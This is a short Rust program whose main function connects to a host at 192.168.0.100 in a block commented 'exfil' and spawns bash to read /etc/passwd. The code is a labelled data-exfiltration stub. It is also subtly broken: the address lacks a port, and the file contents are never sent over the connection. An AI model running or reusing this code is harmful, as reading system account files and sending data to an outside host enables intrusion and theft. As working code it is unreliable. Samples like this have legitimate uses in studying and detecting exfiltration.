use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("192.168.0.100") { /* exfil */ }
    Command::new("bash").arg("-c").arg("cat /etc/passwd").spawn().ok();
}
